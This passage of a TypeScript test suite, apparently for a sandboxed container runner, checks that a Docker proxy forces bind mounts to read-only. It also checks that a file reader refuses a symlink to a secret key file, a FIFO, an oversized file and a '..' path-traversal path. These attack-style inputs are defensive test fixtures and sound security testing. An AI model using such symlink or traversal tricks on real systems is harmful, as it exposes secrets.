      await d.call('POST', '/v1.45/containers/create', {
        Image: 'x',
        HostConfig: {
          NetworkMode: 'none',
          Binds: [`${d.card}:/w`],
          Mounts: [{ Type: 'bind', Source: d.card, Target: '/m' }],
        },
      }),
    ).toBe(200);
    const body = JSON.parse(d.seen.filter((s) => s.url.endsWith('/containers/create')).at(-1)?.body ?? '{}');
    expect(body.HostConfig.Binds).toEqual([`${d.card}:/w:ro`]);
    expect(body.HostConfig.Mounts[0].ReadOnly).toBe(true);
    await d.proxy.close();
  });
});

describe('Rework 1 (REVIEW S1): the runner reads a box-written recipe safely', () => {
  it('a link, a FIFO or an oversized file is refused at once; a plain file is read', async () => {
    const { readBoxFile } = await import('../src/box/folder-check.ts');
    const { execFileSync } = await import('node:child_process');
    const base = realpathSync(tmp('aom-rb-'));
    const secret = join(realpathSync(tmp('aom-sec-')), 'policy.key');
    writeFileSync(secret, 'SECRET');
    symlinkSync(secret, join(base, 'link.json'));
    execFileSync('mkfifo', [join(base, 'fifo.json')]);
    writeFileSync(join(base, 'big.json'), 'x'.repeat(70_000));
    writeFileSync(join(base, 'ok.json'), '{"services":[]}');
    expect(readBoxFile(join(base, 'link.json'), base, 65536)).toEqual({ error: expect.any(String) });
    expect(JSON.stringify(readBoxFile(join(base, 'link.json'), base, 65536))).not.toContain('SECRET');
    const t = Date.now();
    expect(readBoxFile(join(base, 'fifo.json'), base, 65536)).toEqual({ error: 'not a regular file' });
    expect(Date.now() - t).toBeLessThan(2000);
    expect(readBoxFile(join(base, 'big.json'), base, 65536)).toEqual({ error: 'larger than 65536 bytes' });
    expect(readBoxFile(join(base, 'ok.json'), base, 65536)).toBe('{"services":[]}');
    expect(readBoxFile(join(base, '..', 'x'), base, 65536)).toEqual({ error: expect.any(String) });
  });
});
